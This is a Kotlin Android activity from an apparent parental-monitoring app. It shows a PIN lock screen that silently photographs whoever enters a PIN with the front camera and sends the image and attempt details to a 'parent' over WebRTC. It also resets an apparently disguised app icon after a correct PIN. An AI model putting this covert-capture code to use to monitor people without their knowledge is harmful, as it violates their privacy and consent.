package nexus.android.child.applock

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.util.Base64
import nexus.android.child.MainActivity
import nexus.android.child.R
import java.io.ByteArrayOutputStream

/**
 * App Lock screen that requires PIN entry to access the real app.
 * Takes a selfie on any PIN attempt and sends alert to parent.
 */
class AppLockActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "AppLockActivity"
        private const val PIN_LENGTH = 4
    }

    private lateinit var pinDotsContainer: LinearLayout
    private lateinit var lockoutText: TextView
    private lateinit var messageText: TextView
    private lateinit var keypadContainer: View
    
    private val pinDots = mutableListOf<ImageView>()
    private var enteredPin = StringBuilder()
    private var deviceId: String? = null
    
    // Camera for selfie
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var cameraHandler: Handler? = null
    private var cameraThread: HandlerThread? = null
    
    // Lockout timer
    private var lockoutTimer: CountDownTimer? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_app_lock)
        
        // Get device ID
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        deviceId = prefs.getString("device_id", null)
        
        initViews()
        setupKeypad()
        checkLockoutState()
        startCameraThread()
    }

    override fun onResume() {
        super.onResume()
        checkLockoutState()
    }

    override fun onDestroy() {
        super.onDestroy()
        lockoutTimer?.cancel()
        closeCamera()
        stopCameraThread()
    }

    private fun initViews() {
        pinDotsContainer = findViewById(R.id.pin_dots_container)
        lockoutText = findViewById(R.id.lockout_text)
        messageText = findViewById(R.id.message_text)
        keypadContainer = findViewById(R.id.keypad_container)
        
        // Initialize PIN dots
        for (i in 0 until PIN_LENGTH) {
            val dot = pinDotsContainer.getChildAt(i) as ImageView
            pinDots.add(dot)
        }
        
        updatePinDots()
    }

    private fun setupKeypad() {
        // Number buttons 0-9
        val buttonIds = listOf(
            R.id.btn_1, R.id.btn_2, R.id.btn_3,
            R.id.btn_4, R.id.btn_5, R.id.btn_6,
            R.id.btn_7, R.id.btn_8, R.id.btn_9,
            R.id.btn_0
        )
        
        val numbers = listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0")
        
        buttonIds.forEachIndexed { index, buttonId ->
            findViewById<View>(buttonId).setOnClickListener {
                onNumberPressed(numbers[index])
            }
        }
        
        // Backspace button
        findViewById<View>(R.id.btn_backspace).setOnClickListener {
            onBackspacePressed()
        }
        
        // Clear button (optional, can be empty space)
        findViewById<View>(R.id.btn_clear)?.setOnClickListener {
            clearPin()
        }
    }

    private fun onNumberPressed(number: String) {
        if (AppLockManager.isLockedOut(this)) {
            shakeView(pinDotsContainer)
            return
        }
        
        if (enteredPin.length < PIN_LENGTH) {
            enteredPin.append(number)
            updatePinDots()
            
            if (enteredPin.length == PIN_LENGTH) {
                verifyPin()
            }
        }
    }

    private fun onBackspacePressed() {
        if (enteredPin.isNotEmpty()) {
            enteredPin.deleteCharAt(enteredPin.length - 1)
            updatePinDots()
        }
    }

    private fun clearPin() {
        enteredPin.clear()
        updatePinDots()
    }

    private fun updatePinDots() {
        for (i in 0 until PIN_LENGTH) {
            val isFilled = i < enteredPin.length
            pinDots[i].setImageResource(
                if (isFilled) R.drawable.pin_dot_filled else R.drawable.pin_dot_empty
            )
        }
    }

    private fun verifyPin() {
        val pin = enteredPin.toString()
        
        // Take selfie on any attempt (before verification)
        takeSelfieAndSendAlert(pin)
        
        if (AppLockManager.verifyPin(this, pin)) {
            // Correct PIN
            onPinCorrect()
        } else {
            // Wrong PIN
            onPinIncorrect()
        }
    }

    private fun onPinCorrect() {
        AppLockManager.recordUnlockTime(this)
        messageText.text = getString(R.string.app_lock_access_granted)
        messageText.setTextColor(ContextCompat.getColor(this, R.color.gmail_status_connected))
        
        // Use a handler to delay the activity launch, allowing UI to update
        Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                // Get the currently selected icon type
                val currentIcon = nexus.android.child.utils.AppCustomizationManager.getCurrentIconType(this)
                
                // If using a custom icon, reset to DEFAULT
                // This properly handles all component state changes
                if (currentIcon != nexus.android.child.utils.AppCustomizationManager.IconType.DEFAULT) {
                    Log.d(TAG, "Resetting icon from ${currentIcon.name} to DEFAULT")
                    nexus.android.child.utils.AppCustomizationManager.changeAppIcon(
                        this,
                        nexus.android.child.utils.AppCustomizationManager.IconType.DEFAULT
                    )
                    Log.d(TAG, "Icon reset to DEFAULT successfully")
                }
                
                // Small delay to allow system to process component changes
                Thread.sleep(300)
                
                // Launch MainActivity
                val intent = Intent(this, MainActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                intent.putExtra("skip_app_lock_check", true)
                
                startActivity(intent)
                Log.d(TAG, "MainActivity started successfully")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error in onPinCorrect: ${e.message}", e)
                // Fallback: try to launch via package manager
                try {
                    val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                    if (launchIntent != null) {
                        launchIntent.putExtra("skip_app_lock_check", true)
                        startActivity(launchIntent)
                        Log.d(TAG, "Launched via package manager")
                    }
                } catch (e2: Exception) {
                    Log.e(TAG, "Fallback launch failed: ${e2.message}", e2)
                }
            }
            
            finish()
        }, 500)
    }

    private fun onPinIncorrect() {
        AppLockManager.recordFailedAttempt(this)
        
        // Shake animation
        shakeView(pinDotsContainer)
        
        // Clear PIN
        clearPin()
        
        // Update message
        val failedAttempts = AppLockManager.getFailedAttempts(this)
        val remaining = AppLockManager.MAX_FAILED_ATTEMPTS - failedAttempts
        
        if (remaining > 0) {
            messageText.text = getString(R.string.app_lock_wrong_pin, remaining)
            messageText.setTextColor(ContextCompat.getColor(this, R.color.purple_200))
        }
        
        // Check if now locked out
        checkLockoutState()
    }

    private fun checkLockoutState() {
        if (AppLockManager.isLockedOut(this)) {
            showLockout()
        } else {
            hideLockout()
        }
    }

    private fun showLockout() {
        keypadContainer.alpha = 0.3f
        lockoutText.visibility = View.VISIBLE
        messageText.text = getString(R.string.app_lock_too_many_attempts)
        messageText.setTextColor(ContextCompat.getColor(this, R.color.purple_200))
        
        // Start countdown timer
        lockoutTimer?.cancel()
        lockoutTimer = object : CountDownTimer(
            AppLockManager.getRemainingLockoutTime(this),
            1000
        ) {
            override fun onTick(millisUntilFinished: Long) {
                val minutes = millisUntilFinished / 60000
                val seconds = (millisUntilFinished % 60000) / 1000
                lockoutText.text = getString(R.string.app_lock_try_again, minutes, seconds)
            }

            override fun onFinish() {
                hideLockout()
            }
        }.start()
    }

    private fun hideLockout() {
        keypadContainer.alpha = 1.0f
        lockoutText.visibility = View.GONE
        messageText.text = getString(R.string.app_lock_message)
        messageText.setTextColor(ContextCompat.getColor(this, R.color.white))
    }

    private fun shakeView(view: View) {
        val shake = AnimationUtils.loadAnimation(this, R.anim.shake)
        view.startAnimation(shake)
    }

    // ==================== Camera & Selfie ====================

    private fun startCameraThread() {
        cameraThread = HandlerThread("CameraThread").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)
    }

    private fun stopCameraThread() {
        cameraThread?.quitSafely()
        try {
            cameraThread?.join()
            cameraThread = null
            cameraHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping camera thread", e)
        }
    }

    private fun takeSelfieAndSendAlert(enteredPin: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted, sending alert without selfie")
            sendAlertToParent(enteredPin, null)
            return
        }
        
        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            val frontCameraId = findFrontCamera(cameraManager)
            
            if (frontCameraId == null) {
                Log.w(TAG, "No front camera found")
                sendAlertToParent(enteredPin, null)
                return
            }
            
            openCameraAndCapture(cameraManager, frontCameraId, enteredPin)
        } catch (e: Exception) {
            Log.e(TAG, "Error taking selfie", e)
            sendAlertToParent(enteredPin, null)
        }
    }

    private fun findFrontCamera(cameraManager: CameraManager): String? {
        for (cameraId in cameraManager.cameraIdList) {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                return cameraId
            }
        }
        return null
    }

    @Suppress("MissingPermission")
    private fun openCameraAndCapture(
        cameraManager: CameraManager,
        cameraId: String,
        enteredPin: String
    ) {
        // Setup ImageReader
        imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null) {
                val bitmap = imageToBitmap(image)
                image.close()
                
                if (bitmap != null) {
                    val base64 = bitmapToBase64(bitmap)
                    sendAlertToParent(enteredPin, base64)
                } else {
                    sendAlertToParent(enteredPin, null)
                }
                
                closeCamera()
            }
        }, cameraHandler)
        
        // Open camera
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                captureImage(camera, enteredPin)
            }

            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
                cameraDevice = null
            }

            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "Camera error: $error")
                camera.close()
                cameraDevice = null
                sendAlertToParent(enteredPin, null)
            }
        }, cameraHandler)
    }

    private fun captureImage(camera: CameraDevice, enteredPin: String) {
        try {
            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(imageReader!!.surface)
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
            
            camera.createCaptureSessionByOutputConfigurations(
                listOf(android.hardware.camera2.params.OutputConfiguration(imageReader!!.surface)),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            session.capture(captureBuilder.build(), null, cameraHandler)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error capturing image", e)
                            sendAlertToParent(enteredPin, null)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Camera session configuration failed")
                        sendAlertToParent(enteredPin, null)
                    }
                },
                cameraHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up capture", e)
            sendAlertToParent(enteredPin, null)
        }
    }

    private fun imageToBitmap(image: Image): Bitmap? {
        return try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            
            // Rotate if needed (front camera often needs rotation)
            val matrix = Matrix()
            matrix.postRotate(-90f)
            matrix.postScale(-1f, 1f) // Mirror for front camera
            
            Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
        } catch (e: Exception) {
            Log.e(TAG, "Error converting image to bitmap", e)
            null
        }
    }

    private fun bitmapToBase64(bitmap: Bitmap): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
        val bytes = outputStream.toByteArray()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    private fun closeCamera() {
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    // ==================== Alert to Parent ====================

    private fun sendAlertToParent(enteredPin: String, selfieBase64: String?) {
        val id = deviceId
        
        val isCorrect = AppLockManager.verifyPin(this, enteredPin)
        val failedAttempts = AppLockManager.getFailedAttempts(this)
        val isLockedOut = AppLockManager.isLockedOut(this)
        
        // Send via WebRTC data channel (preferred method)
        val sent = AppLockAlertSender.sendAlert(
            timestamp = System.currentTimeMillis(),
            pinCorrect = isCorrect,
            failedAttempts = failedAttempts,
            isLockedOut = isLockedOut,
            selfieBase64 = selfieBase64,
            deviceId = id
        )
        
        if (sent) {
            Log.d(TAG, "Alert sent to parent via data channel")
        } else {
            Log.w(TAG, "Failed to send alert via data channel (channel may not be connected)")
        }
    }
}
